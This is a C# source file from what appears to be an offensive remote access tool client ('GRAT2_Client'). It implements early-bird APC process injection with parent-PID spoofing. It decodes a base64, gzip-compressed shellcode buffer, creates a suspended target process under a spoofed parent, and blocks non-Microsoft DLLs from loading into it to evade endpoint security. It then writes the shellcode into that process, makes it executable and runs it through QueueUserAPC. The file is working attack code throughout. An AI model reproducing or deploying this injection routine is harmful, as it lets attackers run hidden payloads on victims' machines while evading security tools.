using System;
using System.Runtime.InteropServices;
using GRAT2_Client.PInvoke;
using static GRAT2_Client.PInvoke.flags;

namespace GRAT2_Client.Injectious
{
    class UserAPCPPID
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        // Mitigation Policy
        private const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
        private const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

        // STARTUPINFOEX members
        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        public static string InjectAPCPPID(string[] arguments)
        {

            string targetProcess = arguments[2].Replace('+', ' ');

            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));
            var blockMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            int parentId = SearchPID.SearchForPPID();
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            IntPtr lpThreadId = IntPtr.Zero;
            uint oldProtect = 0;
            var lpValueProc = IntPtr.Zero;

            STARTUPINFOEX siEx = new STARTUPINFOEX();
            flags.PROCESS_INFORMATION pi = new flags.PROCESS_INFORMATION();

            var processSecurity = new flags.SECURITY_ATTRIBUTES();
            var threadSecurity = new flags.SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            IntPtr pinnedBuffer = handle.AddrOfPinnedObject();

            try
            {
                var lpSize = IntPtr.Zero;
                Interop.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Interop.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);

                if (IntPtr.Size == 4)
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, IntPtr.Zero);
                }
                else
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, new IntPtr((long)BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                }

                Interop.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, blockMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                var parentHandle = Interop.OpenProcess(flags.ProcessAccessRights.CreateProcess | flags.ProcessAccessRights.DuplicateHandle, false, parentId);
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                Interop.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                bool success = Interop.CreateProcess(targetProcess, null, ref processSecurity, ref threadSecurity, false, flags.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | flags.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pi);
                IntPtr resultPtr = Interop.VirtualAllocEx(pi.hProcess, IntPtr.Zero, buffer.Length, MEM_COMMIT, PAGE_READWRITE);
                IntPtr bytesWritten = IntPtr.Zero;
                bool resultBool = Interop.WriteProcessMemory(pi.hProcess, resultPtr, pinnedBuffer, buffer.Length, out bytesWritten);

                IntPtr sht = Interop.OpenThread(flags.ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);

                resultBool = Interop.VirtualProtectEx(pi.hProcess, resultPtr, buffer.Length, PAGE_EXECUTE_READ, out oldProtect);

                IntPtr ptr = Interop.QueueUserAPC(resultPtr, sht, IntPtr.Zero);
                IntPtr ThreadHandle = pi.hThread;
                Interop.ResumeThread(ThreadHandle);

                handle.Free();

            }
            catch (Exception ex)
            {
                handle.Free();
                Console.WriteLine(ex.Message);
            }

            return null;

        }
    }
}
